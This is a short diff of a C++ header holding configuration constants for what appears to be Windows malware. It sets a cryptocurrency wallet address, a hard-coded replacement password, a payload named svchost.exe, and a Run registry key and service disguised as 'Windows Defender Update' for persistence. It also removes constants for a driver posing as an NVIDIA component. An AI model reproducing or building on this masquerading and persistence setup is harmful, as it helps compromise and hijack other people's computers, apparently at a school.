@@ -1,12 +1,10 @@
-##pragma once
+#pragma once
 #include <string>
 
 const std::wstring WALLET       = L"UQBc4oF7CJFwItzeiu-3R_8ODlk--uzkvIIcfre_ZXNfOwIq";
 const std::wstring NEW_PASSWORD = L"SCHOOLhACK12389S";
 
 const wchar_t* PAYLOAD_NAME = L"svchost.exe";
-const wchar_t* DRV_NAME     = L"NvRmDrv.sys";
-const wchar_t* DRV_SVC      = L"NvRmDrv";
 const wchar_t* REG_RUN_KEY  = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
 const wchar_t* REG_RUN_NAME = L"Windows Defender Update";
 const wchar_t* SVC_NAME     = L"WinDefendUpdate";
